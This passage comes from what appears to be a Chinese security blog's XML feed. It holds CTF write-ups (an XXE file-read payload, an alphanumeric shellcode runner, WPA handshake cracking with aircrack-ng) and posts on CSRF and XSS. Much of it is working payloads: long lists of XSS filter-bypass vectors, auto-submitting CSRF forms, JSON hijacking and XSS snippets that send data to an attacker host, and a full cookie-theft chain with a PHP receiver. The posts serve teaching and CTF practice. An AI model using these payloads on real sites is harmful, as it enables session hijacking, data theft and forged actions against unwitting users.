s%3a5%3a"admin"%3b%00%00%00%00%00%00%00%c0%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80s%3a5%3a"guest"%3b`hsh = fcdc3840332555511c4e4323f6decb07` [61dctf]admin抓包后发现貌似和flag在管理员手机的题目有点相似，扫目录发现有robots.txt。访问后发现.php访问的flag提交竟然不对。突然发现flag是flag{hello guest}，而题目是admin显然这是个假flag。 然后尝试抓包的真flag。 api调用Hint：请设法获得目标机器/home/ctf/flag.txt中的flag值。 则想办法文件读取。加上题目提示很容易想到调用别的东西来文件读取。 右键看页面源码发现有json和xml。可能就是xml注入进行任意文件读取。 抓包把content-type=json改成content-type=xml。然后传一段任意文件读取的xml代码： 1234&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE root [&lt;!ENTITY name SYSTEM &quot;file://home/ctf/flag.txt&quot;&gt; ]&gt; &lt;root&gt;&amp;name;&lt;/root&gt; 有关于xml的知识之前也是接触过XEE外部实体注入漏洞。后面可能出一篇能用的xml知识。]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JarvisOJ-Basic-WriteUp]]></title>
    <url>%2F2018%2F09%2F23%2FJarvisOJ-Basic-WriteUp%2F</url>
    <content type="text"><![CDATA[0x01.base64?base家族，py脚本decode： import base64 str1 =&#39;GUYDIMZVGQ2DMN3CGRQTONJXGM3TINLGG42DGMZXGM3TINLGGY4DGNBXGYZTGNLGGY3DGNBWMU3WI===&#39; try: print base64.b64decode(str1) except: try: print base64.b32decode(str1) except: print base64.b16decode(str1) 0x02.USS Lab浙大就是diao，百度谷歌一把梭 0x03.veryeasylinux 命令：strings veayeasy的flag 0x04.段子对于不懂的，googl百度一把梭。发现棍斤拷的十六进制码的flag 棍斤拷乱码： 源于GBK字符集和Unicode字符集之间的转换问题。Unicode和老编码体系的转化过程中，肯定有一些字，用Unicode是没法表示的，Unicode官方用了一个占位符来表示这些文字，这就是：U+FFFD REPLACEMENT CHARACTER。那么U+FFFD的UTF-8编码出来，恰好是 ‘\xef\xbf\xbd’。如果这个’\xef\xbf\xbd’，重复多次，例如 ‘\xef\xbf\xbd\xef\xbf\xbd’，然后放到GBK/CP936/GB2312/GB18030的环境中显示的话，一个汉字2个字节，最终的结果就是：锟斤拷——锟(0xEFBF)，斤（0xBDEF），拷（0xBFBD）。 烫烫烫乱码： 在windows平台下，ms的编译器（也就是vc带的那个）在 Debug 模式下，会把未初始化的栈内存全部填成 0xcc，用字符串来看就是”烫烫烫烫烫烫烫”，未初始化的堆内存全部填成0xcd，字符串看就是“屯屯屯屯屯屯屯屯”。也就是说出现了烫烫烫，赶紧检查初始化吧。。。 0x05.手贱仔细看MD5码。发现多了一个I，删除破解MD5得flag 0x06.美丽的实验室LogoStegSolve一把梭得flag 0x07.veryeasyRSARSAtool一把梭得flag 0x08.神秘文件磁盘文件Linux挂载，写py脚本跑： flag = ‘’ for i in range(1,254): f = open(str(i)) flag +=f.read() f.close() print flag 0x09.公倍数python脚本一把梭 flag = 0 for i in xrange(3,1000000000,3): flag +=i for i in xrange(5,1000000000,5): flag +=i for i in xrange(15,1000000000,15): flag -+i print flag 0x0A.Easy Crackme好吧，不会Reverse 0x0B.Swcretburp抓包http头中发现Secret的flag 0x0C.爱吃培根的出题人培根密码加密，培根加密本质是替换密码。以ab（01）替换，所以本质上所有正反两性都可以培根加解密，比如文字的正体与斜体。 注意：有两个密码表。表中一个字母替换成5个字母。 所以把密文标点符号去除，每五个字母分一组。然后替换成ab：（小写字母替换成a，大写字母替换成b） bacoN isone ofaMe rICaS sWEet hEart SitsA dARli nGSuC CulEn tfOoD tHAtP aIRsF lawLE aaaab aaaaa aaaba abbab abbaa abaaa baaab abbaa abbab baaba aabab abbab abbab aaabb 对应密码表②得flag。 0x0D.Easy RSARSA tools一把梭 0x0E.ROPGadget不会PWN 0x0F.取证取证神器Volatility 0x11.Baby’s Crack不会逆向 0x12.Help!!zip伪加密，然后word.xdoc里面一张图片常规操作后无果。然后把后缀也改成zip发现一张图片的flag 0x13.Shellcodeshellcode不就是非法数据当做代码执行吗! #include&lt;stdio.h&gt; char shellcode[] = &quot;PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIYIhkmKzyCDq4l4FQyBlrRWEahI1tLKT16Pnk1ftLnkPvwlnkW6fhNkan5pNkgF6XPOR8T5HsCivaN19okQSPlKRLvD6DNk3uelNkpTthRXuQ9znk2jEHLK1Ja0FaXkhcTtBink4tlKUQhnvQYotqo0ylnLMTO0SDEWZahOtMwqhG8kXteksLwTdh1e8aLKsja4uQ8kavLKdLrklK0ZeL7qjKLKUTLKuQM8k9bdvDeL1qiSnR5XVIXTOyjENikrphNnrnVnhlBrzHooKOYoyok93u7tOKCNyHzBBSnguLgTcbyxlNKOYoYoMYaUTHphRL2LupQQ0htsFRTn541x3E2Se5T26PyKK8QLTddJlIZFBvyoSeUTLIkrv0oKy8ORpMmlk7Gl6DBrm8SoyoioyoaxrOqh0XwP1xu1Qw1upBbHrmrED3T34qiKOxQLTdEZOyZCaxQmRxgPUp0hpnPn4srRe8BDSo2PT7axqOCWROpophSYpnSo04u83K72Peu70hBpCsqDpF4qHIMXpLQ429k98aEaJr1BF3Ca3bIozp01IPf0Yof5GxAA&quot; int main() { int (*ret)()=(int(*)())shellcode; ret(); return 0; } 0x14.A Piece Of Cake字符频率统计解密脚本网站一把梭，找到flag is ….. 0x15.-.-字符串最简单的摩斯电码 0x16.德军的密码二进制密码，py脚本跑： #–encoding:utf-8– table = {‘A’:’1000001’,’N’:’1001110’, ‘B’:’1000010’,’O’:’1001111’, ‘C’:’1000011’,’P’:’1010000’, ‘D’:’1000100’,’Q’:’1010001’, ‘E’:’1000101’,’R’:’1010010’, ‘F’:’1000110’,’S’:’1010011’, ‘G’:’1000111’,’T’:’1010100’, ‘H’:’1001000’,’U’:’1010101’, ‘I’:’1001001’,’V’:’1010110’, ‘J’:’1001010’,’W’:’1010111’, ‘K’:’1001011’,’X’:’1011000’, ‘L’:’1001100’,’Y’:’1011001’, ‘M’:’1001101’,’Z’:’1011010’} key_list=[] value_list=[] for key,value in table.items(): key_list.append(key) valuelist.append(value) #print keylist, value_list def get_key_of_value(value): if value in valuelist: getvalueindex = valuelist.index(value) #print type(keylist[getvalueindex]) return keylist[get_value_index] else: print “你要查询的值%s不存在” %get_value def how_to(a,b): if a in [‘0’,’1’] and b in [‘0’,’1’]: if a == ‘1’ and b == ‘1’: return ‘0’ elif a == ‘0’ and b == ‘0’: return ‘0’ else: return ‘1’ else: return 0 def binturn(arg): binstring = ‘’ for i in arg: binstring += table[i] return binstring def encrypt(plain,key): binkey = binturn(key) binplain = bin_turn(plain) chiper = ‘’ if len(binplain)==len(binkey): for i in range(0,len(binplain)): chiper += how_to(binkey[i],binplain[i]) #print return chiper else: return 0 def decrypt(chiper,key): binkey = bin_turn(key) plain = ‘’ if len(chiper)==len(binkey): for i in range(0,len(chiper)): plain += how_to(binkey[i],chiper[i]) #print binkey[i] #print plain return plain else: return 0 key = ‘WELCOMETOCFF’ chiper = ‘000000000000000000000000000000000000000000000000000101110000110001000000101000000001’ binplain = decrypt(chiper,key) print type(binplain) plain = ‘’ for i in xrange(0,len(binplain),7): plain += str(get_key_of_value(binplain[i:i+7])) print plain 0x17.握手包kali linux强大的wifi破解工具：Aircrack 破解前下解压kali自带的字典： gzip -d /usr/share/wordlists/rockyou.txt.gz 上命令破解： aircrack-ng -a2 -w /usr/share/wordlists/rockyou.txt ./wifi.cap]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web安全—CSRF防御及绕过]]></title>
    <url>%2F2018%2F07%2F11%2FWeb%E5%AE%89%E5%85%A8%E2%80%94CSRF%E9%98%B2%E5%BE%A1%E5%8F%8A%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[一、CSRF防御（一）验证码 缺点：验证影响用户体验 工具：web-fuzz测试工具可绕过普通验证码 （二）检测Refer 安全性：Refer抓包可以篡改 （三）限制session生命周期 缩短session有效时间 （四）一次性Token 随机不可预测生产token 另外使用Token时应注意Token的保密性，尽量把敏感操作由GET改为POST，以form或AJAX形式提交，避免Token泄露。 安全性：但是必须保证Token的安全 （五）同源策略 在前后端分离的前提下（例如使用ajax提交数据）设置不了token，可以给 cookie 新增 SameSite 属性，通过这个属性可以标记哪个 cookie 只作为同站 cookie （即第一方 cookie，不能作为第三方 cookie），既然不能作为第三方 cookie ，那么别的网站发起第三方请求时，第三方网站是收不到这个被标记关键 cookie，后面的鉴权处理就好办了。这一切都不需要做 token 生命周期的管理，也不用担心 Referer 会丢失或被中途被篡改 SameStie 有两个值：Strict 和 Lax: SameSite=Strict 严格模式，使用 SameSite=Strict 标记的 cookie 在任何情况下（包括异步请求和同步请求），都不能作为第三方 cookie。 SameSite=Lax 宽松模式，使用 SameSite=Lax 标记的 cookie 在异步请求 和 form 提交跳转的情况下，都不能作为第三方 cookie。 那么Strict和Lax的如何使用呢？ 登录态关键的 cookie 都可以设置为 Strict。 后台根据用户的登录态动态新建一个可以用于校验登录态的 cookie ，设置为 Lax ，这样的话对外推广比如微博什么的，你希望用户在微博上打开你的链接还能保持登录态。 如果你的页面有可能被第三方网站去iframe或有接口需要做jsonp ，那么都不能设置 Strict 或 Lax。 二、CSRF绕过-绕过Referer（一）Referer为空 利用ftp://,http://,https://,file://,javascript:,data: 这个时候浏览器地址栏是file://开头的，如果这个HTML页面向任何http站点提交请求的话，这些请求的Referer都是空的。 例子：利用data协议 12345&lt;html&gt; &lt;body&gt; &lt;iframe src="data:text/html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg=="&gt; &lt;/body&gt; &lt;/html&gt; bese64编码 解码即可看到代码 利用https协议 https向http跳转的时候Referer为空 拿一个https的webshell 1&lt;iframe src="https://xxxxx.xxxxx/attack.php"&gt; attack.php写上CSRF攻击代码 （二）判断Referer是某域情况下绕过 比如找的csrf是xxx.com 验证的referer是验证的*.xx.com 可以找个二级域名 之后&lt;img “csrf地址”&gt; 之后在把文章地址发出去就可以伪造。 （三）判断Referer是否存在某关键词 referer判断存在不存在google.com这个关键词 在网站新建一个google.com目录，把CSRF存放在google.com目录,即可绕过 （四）判断Referer是否是某域名 判断了Referer开头是否以126.com以及126子域名 不验证根域名为126.com 那么可以构造子域名x.126.com.xxx.com作为蠕虫传播的载体服务器，即可绕过。]]></content>
      <categories>
        <category>WEB安全</category>
        <category>Browser端安全</category>
      </categories>
      <tags>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web安全—CSRF基础及利用]]></title>
    <url>%2F2018%2F07%2F10%2FWeb%E5%AE%89%E5%85%A8%E2%80%94CSRF%E5%9F%BA%E7%A1%80%E5%8F%8A%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[一、CSRF理解 CSRF/XSRF跨站点请求伪造(Cross—Site Request Forgery)，也被称为：one click attack/session riding。跟XSS攻击一样，存在巨大的危害性，可以这样来理解： 攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。 二、CSRF攻击原理及过程 如下： 其中Web A为存在CSRF漏洞的网站，Web B为攻击者构建的恶意网站，User C为Web A网站的合法用户。 1. 用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A； 2.在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A； 3. 用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B； 4. 网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A； 5. 浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。 CSRF攻击实例 受害者 Bob 在银行有一笔存款，通过对银行的网站发送请求： 1http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=bob2 可以使 Bob 把 1000000 的存款转到 bob2 的账号下。通常情况下，该请求发送到网站后，服务器会先验证该请求是否来自一个合法的 session，并且该 session 的用户 Bob 已经成功登陆。 黑客 Mallory 自己在该银行也有账户，他知道上文中的 URL 可以把钱进行转帐操作。Mallory 可以自己发送一个请求给银行： 1http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory。 但是这个请求来自 Mallory 而非 Bob，他不能通过安全认证，因此该请求不会起作用。 这时，Mallory 想到使用 CSRF 的攻击方式，他先自己做一个网站，在网站中放入如下代码： 1src=“http://bank.example/withdrawaccount=bob&amp;amount=1000000&amp;for=Mallory ” 并且通过广告等诱使 Bob 来访问他的网站。当 Bob 访问该网站时，上述 url 就会从 Bob 的浏览器发向银行，而这个请求会附带 Bob 浏览器中的 cookie 一起发向银行服务器。 大多数情况下，该请求会失败，因为他要求 Bob 的认证信息。但是，如果 Bob 当时恰巧刚访问他的银行后不久，他的浏览器与银行网站之间的 session 尚未过期，浏览器的 cookie 之中含有 Bob 的认证信息。 这时，悲剧发生了，这个 url 请求就会得到响应，钱将从 Bob 的账号转移到 Mallory 的账号，而 Bob 当时毫不知情。等以后 Bob 发现账户钱少了，即使他去银行查询日志，他也只能发现确实有一个来自于他本人的合法请求转移了资金，没有任何被攻击的痕迹。而 Mallory 则可以拿到钱后逍遥法外。 三、CSRF攻击获取数据的方法 要获取的关键数据： 用户 id 用户昵称 用户 email 用户个人页面地址 ….. （一）同域内 CSRF攻击获取数据几乎没有任何限制 （二）跨域 CSRF 攻击获取数据的几种方法总结： 1、XSS 12345678如之前关于XSS文章做的三方的演示，使用目标站点上的XSS漏洞：&lt;iframe width=0 height=0 src=‘http://目标站点/search.php?k=“&gt;&lt;script src=http://恶意站点/get.js&gt;&lt;/script&gt;’&gt;&lt;/iframe&gt;其中get.js 的代码为：//use DOM method to get your datanew Image(). src=‘http://恶意站点/a.php?data=‘+data;恶意站点的 a.php 文件接收唯一标识等数据，该唯一标识可以是 url 中的或是目标站点url 对应的内容中的。这样受害者就会访问到第三方的恶意网站从而泄露信息。 2、服务端代理技术 3、JSON Hijacing 12345678目标站点使用了 JSON 数据传输用户私有数据，其中包含需要的唯一标识等信息。相关代码：&lt;script&gt; function hijack(o)&#123;//use DOM method to get your datanew Image().src="http://192.168.1.2/JSONHiJack.asp?hi="+escape(data);&#125;&lt;/script&gt;&lt;script src=http://api.fanfou.com/private_messages/inbox.json?callback=hijack&amp;count=2&gt;&lt;/script&gt; 4、Flash AsctionScript（crossdomain.xml） 1234567891011前提是目标站点下存在crossdomain.xml文件，且其配置允许其他域的AS脚本进行跨域请求。&lt;?xml version="1.0"?&gt;&lt;cross-domain-policy&gt;&lt;allow-access-from domain="*" /&gt;&lt;/cross-domain-policy&gt;相关代码：import flash.net.*; var _l = new URLLoader(new URLRequest(“http://目标站点/"));_l.addEventListener(Event.COMPLETE,function()&#123;text1.text = _l.data&#125;);_l.load(); 四、检测方法 最简单的方法就是抓取一个正常请求的数据包，去掉 Referer 字段后再重新提交，如果该提交还有效，那么基本上可以确定存在 CSRF 漏洞。 一些专门针对 CSRF 漏洞进行检测的工具，如CSRFTester，CSRF Request Builder 等。 以 CSRFTester 工具为例 使用 CSRFTester 进行测试时： 1.抓取我们在浏览器中访问过的所有链接以及所有的表单等信息 2.通过在 CSRFTester 中修改相应的表单等信息，重新提交，这相当于一次伪造客户端请求。 3.如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF 漏洞。 当然此款工具也可以被用来进行 CSRF 攻击。 五、CSRF利用 攻击者发现CSRF漏洞——构造代码——发送给受害人——受害人打开——受害人执行代码——完成攻击 相比于XSS少一个获取cookie的步骤。 思路：诱使管理员打开构造的代码！ CSRF出现的地方通常在权限控制的地方 如会员中心、后台管理、用户注册、发布帖子、用户后台处、交易管理处这几个地方 （一）GET类型CSRF 一般由于程序员安全意识不高造成 诱导打开插入恶意连接的代码-&gt;迅速携带cookie执行恶意操作 1&lt;img src=http://xxxx.org/csrf.php?xx=11 /&gt; （二）POST型CSRF 危害小于GET型 自动提交表单：访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。 1234&lt;form action=http://wooyun.org/csrf.php method=POST&gt;&lt;input type="text" name="xx" value="11" /&gt;&lt;/form&gt;&lt;script&gt; document.forms[0].submit(); &lt;/script&gt; （三）其他利用 过基础认证的CSRF(常用于路由器): 1&lt;img src=http://admin:admin@192.168.1.1 /&gt; 加载该图片后，路由器会给用户一个合法的SESSION，就可以进行下一步操作了。 CSRF攻击会根据场景的不同而危害迥异。小到诱使用户留言，大到垂直越权进行操作。这些攻击的请求都是跨域发出,并且至关重要的一点，都是在受害者的身份得到认证以后发生的。另外，第一个场景中攻击时并没有使用JavaScrpit，这说明CSRF攻击并不依赖于JavaScript。]]></content>
      <categories>
        <category>WEB安全</category>
        <category>Browser端安全</category>
      </categories>
      <tags>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web安全—XSS触发、绕过、盗取Cookie]]></title>
    <url>%2F2018%2F07%2F09%2FWeb%E5%AE%89%E5%85%A8%E2%80%94XSS%E8%A7%A6%E5%8F%91%E3%80%81%E7%BB%95%E8%BF%87%E3%80%81%E7%9B%97%E5%8F%96Cookie%2F</url>
    <content type="text"><![CDATA[一、XSS常见标签触发（无过滤）（一）直接触发 &lt;script&gt; 1&lt;scirpt&gt;alert("xss");&lt;/script&gt; &lt;img&gt; 123&lt;img src=1 onerror=alert("xss");&gt;&lt;img src=1 onmouseover=alert('xss')&gt;&lt;img STYLE="background-image:url(javascript:alert('XSS'))"&gt; &lt;input&gt; 123456789101112131415&lt;input name="name" value=""&gt;&lt;input value="" onclick=alert('xss') type="text"&gt;&lt;input name="name" value="" onmouseover=prompt('xss') bad=""&gt;&lt;input name="name" value=""&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&lt;input onfocus="alert('xss');"&gt; 闭合&lt;input&gt;标签payload: '&gt; &lt;script&gt;alert(xss)&lt;/script&gt;拼接后的语句：&lt;input type="text" value="'&gt; &lt;script&gt;alert(xx)&lt;/script&gt;"&gt;竞争焦点，从而触发onblur事件&lt;input onblur=alert("xss") autofocus&gt;&lt;input autofocus&gt;通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发&lt;input onfocus="alert('xss');" autofocus&gt; &lt;details&gt; 1234&lt;details ontoggle="alert('xss');"&gt;使用open属性触发ontoggle事件，无需用户去触发&lt;details open ontoggle="alert('xss');"&gt; &lt;svg&gt; 1&lt;svg onload=alert("xss");&gt; &lt;select&gt; 1&lt;select onfocus=alert(1)&gt;&lt;/select&gt; &lt;iframe&gt; 1&lt;iframe onload=alert("xss");&gt;&lt;/iframe&gt; &lt;video&gt; 1&lt;video&gt;&lt;source onerror="alert(1)"&gt; &lt;body&gt; 1234&lt;body/onload=alert("xss");&gt;利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发&lt;bodyonscroll=alert("xss");&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt; &lt;textarea&gt; 1&lt;textarea onfocus=alert("xss"); autofocus&gt; &lt;keygen&gt; 1&lt;keygen autofocus onfocus=alert(1)&gt; //仅限火狐 &lt;marquee&gt; 1&lt;marquee onstart=alert("xss")&gt;&lt;/marquee&gt; //Chrome不行，火狐和IE都可以 &lt;isindex&gt; 1&lt;isindex type=image src=1 onerror=alert("xss")&gt;//仅限于IE （二）利用link远程包含js文件 在无CSP的情况下才可以 1&lt;link rel=import href="http://127.0.0.1/1.js"&gt; （三）利用javascript伪协议 &lt;a&gt;标签 123456&lt;a href="https://www.baidu.com"&gt;baidu&lt;/a&gt;&lt;a href="javascript:alert(`xss`);"&gt;xss&lt;/a&gt;&lt;a href="" onclick=alert('xss')&gt;aa&lt;/a&gt;&lt;a href="" onclick=eval(alert('xss'))&gt;aa&lt;/a&gt;&lt;a href=javascript:eval(alert('xss'))&gt;aa&lt;/a&gt;&lt;a href="javascript:aaa" onmouseover="alert(/xss/)"&gt;aa&lt;/a&gt; &lt;iframe&gt;标签 123456&lt;iframe src=javascript:alert('xss');&gt;&lt;/iframe&gt;&lt;iframe src=javascript:alert('xss');height=5width=1000 /&gt;&lt;iframe&gt;&lt;iframe src="data:text/html,&amp;lt;script&amp;gt;alert('xss')&amp;lt;/script&amp;gt&lt;iframe src="aaa" onmouseover=alert('xss') /&gt;&lt;iframe&gt;&lt;iframe src="javascript&amp;colon;prompt&amp;lpar;`xss`&amp; &lt;img&gt;标签 12&lt;img src=javascript:alert('xss')&gt;//IE7以下&lt;img scr="URL" style='Xss:expression(alert(/xss));' &lt;form&gt;标签 123456&lt;form action="Javascript:alert(1)"&gt;&lt;input type=submit&gt;&lt;form action=javascript:alert('xss') method="get"&gt;&lt;form method=post action=aa.asp? onmouseover=prompt('xss')&gt;&lt;form method=post action=aa.asp? onmouseover=alert('xss')&gt;&lt;form action=1 onmouseover=alert('xss)&gt; （四）其他 expression属性 123&lt;img style="xss:expression(alert('xss''))"&gt; // IE7以下&lt;div style="color:rgb(''�x:expression(alert(1))"&gt;&lt;/div&gt; //IE7以下&lt;style&gt;#test&#123;x:expression(alert(/XSS/))&#125;&lt;/style&gt; // IE7以下 background属性 1&lt;table background=javascript:alert(1)&gt;&lt;/table&gt; //在Opera 10.5和IE6上有效 二、XSS绕过（有过滤）（一）过滤空格 用/代替空格 1&lt;img/src="x" /onerror=alert("xss");&gt; （二）过滤关键字 大小写 1&lt;ImG sRc=x onerRor=alert("xss");&gt; 双写关键字（当waf可能会只替换一次且替换为空时） 1&lt;imimgg srsrcc=x onerror=alert("xss");&gt; 字符拼接：利用eval 1&lt;img src="x" onerror="a=`aler`;b=`t`;c='(`xss`);';eval(a+b+c)"&gt; 利用top 1&lt;script&gt;top["al"+"ert"](`xss`);&lt;/script&gt; 其他字符混淆（） 123456有的waf可能是用正则表达式去检测是否有xss攻击，如果我们能fuzz出正则的规则，则我们就可以使用其它字符去混淆我们注入的代码了可利用注释、标签的优先级等1.&lt;&lt;script&gt;alert("xss");//&lt;&lt;/script&gt;2.&lt;title&gt;&lt;img src=&lt;/title&gt;&gt;&lt;img src=x onerror="alert(`xss`);"&gt; //因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效3.&lt;SCRIPT&gt;var a="\\";alert("xss");//";&lt;/SCRIPT&gt; 编码绕过 123456789101112131415161718192021222324Unicode编码img src="x" onerror="&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;"&gt;&lt;img src="x" onerror="eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b')"&gt;url编码&lt;img src="x" onerror="eval(unescape('%61%6c%65%72%74%28%22%78%73%73%22%29%3b'))"&gt;&lt;iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"&gt;&lt;/iframe&gt;ascii编码&lt;img src="x" onerror="eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))"&gt;hex绕过&lt;img src=x onerror=eval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')&gt;八进制&lt;img src=x onerror=alert('\170\163\163')&gt;base64绕过&lt;img src="x" onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw=='))"&gt;&lt;iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4="&gt;String.fromCharCode编码如alert的编码为String.fromCharCode(97,108,101,114,116) （三）过滤双引号、单引号 1.如果是html标签中，可以不用引号。如果是在js中，可以用反引号代替单双引号 1&lt;img src="x" onerror=alert(`xss`);&gt; 2.使用编码绕过 （四）过滤括号 当括号被过滤的时候可以使用throw来绕过 1&lt;svg/onload="window.onerror=eval;throw'=alert\x281\x29';"&gt; （五）过滤RUL地址 使用url编码 1&lt;img src="x" onerror=document.location=`http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/`&gt; 使用IP 12345678910111213141516171.十进制ip&lt;img src="x" onerror=document.location=`http://2130706433/`&gt;2.八进制ip&lt;img src="x" onerror=document.location=`http://0177.0.0.01/`&gt;3.hex&lt;img src="x" onerror=document.location=`http://0x7f.0x0.0x0.0x1/`&gt;4.html标签中用//可以代替http://&lt;img src="x" onerror=document.location=`//www.baidu.com`&gt;5.使用\\但是要注意在windows下\本身就有特殊用途，是一个path 的写法，所以\\在Windows下是file协议，在linux下才会是当前域的协议6.使用中文逗号代替英文逗号（如果在域名中输入中文句号浏览器会自动转化成英文的逗号&lt;img src="x" onerror="document.location=`http://www。baidu。com`"&gt;//会自动跳转到百度 （六）限制字符1234567891011解决限制字符(要求同页面)&lt;script&gt;z='document.'&lt;/script&gt;&lt;script&gt;z=z+'write("'&lt;/script&gt;&lt;script&gt;z=z+'&lt;script'&lt;/script&gt;&lt;script&gt;z=z+' src=ht'&lt;/script&gt;&lt;script&gt;z=z+'tp://ww'&lt;/script&gt;&lt;script&gt;z=z+'w.zoyzo'&lt;/script&gt;&lt;script&gt;z=z+'.cn/1.'&lt;/script&gt;&lt;script&gt;z=z+'js&gt;&lt;/sc'&lt;/script&gt;&lt;script&gt;z=z+'ript&gt;")'&lt;/script&gt;&lt;script&gt;eval_r(z)&lt;/script&gt; （七）引入Html5标签 HTML5中引入了很多新的标签属性，如audio和vedio标签，心得标签带来了新的事件。会绕过现有的过滤器。 存在跨站的HTML5标签 123456789&lt;video&gt;&lt;source onerrot="javascript:alert(1)"&gt;&lt;video onerror="javacript:alert(1)"&gt;&lt;source&gt;&lt;audio onerror="javacript:alert(1)"&gt;&lt;source&gt;&lt;input autofocus onfocus=alert(1)&gt;&lt;select autofocus onfocus=alert(1)&gt;&lt;textarea autofocus onfocus=alert(1)&gt;&lt;keygen autofocus onfocus=alert(1)&gt;&lt;button form=test onformchange=alert(1)&gt;&lt;form&gt;&lt;button formaction="javascript:alert(1)"&gt; SVG标签：svg使用XML格式定义图形 在xml中，$#40;会被解析成( 在XML中实体会自动转义，除了&lt;![CDATA[和]]&gt;包含的实体 1&lt;svg&gt;&lt;script&gt;alert&amp;#40;1)&lt;/script&gt; 三、XSS盗取Cookie 通过跨站漏洞，访问特定页面，获取cookie发送至服务端进行接受处理 攻击者发现XSS漏洞——构造代码——发送给受害人——受害人打开——攻击者获取受害人的cookie——完成攻击 （一）触发端语句1http://127.0.0.1/dvwa/vulnerabilities/xss_r/?name=&lt;script&gt;window.open(“http://127.0.0.1/cookie/xss.html”);&lt;/script&gt;(可设置打开页面属性，不可见) （二）触发端页面12345&lt;script&gt;var cookie=document.cookie;var url = "http://127.0.0.1/cookie/getcookie.php?c="window.location.href=url+cookie;&lt;/script&gt; （三）接收端语句12345678&lt;?php//coolie接受脚本$cookie = $_GET['c'];$file = fopen("cookie.html","w+");fwrite($file,%cookie);fwrite($file,"&lt;hr&gt;");fclose($file);?&gt;]]></content>
      <categories>
        <category>WEB安全</category>
        <category>Browser端安全</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web安全—XSS基础]]></title>
    <url>%2F2018%2F07%2F08%2FWeb%E5%AE%89%E5%85%A8%E2%80%94XSS%E5%9F%BA%E7%A1%80%2F</url>
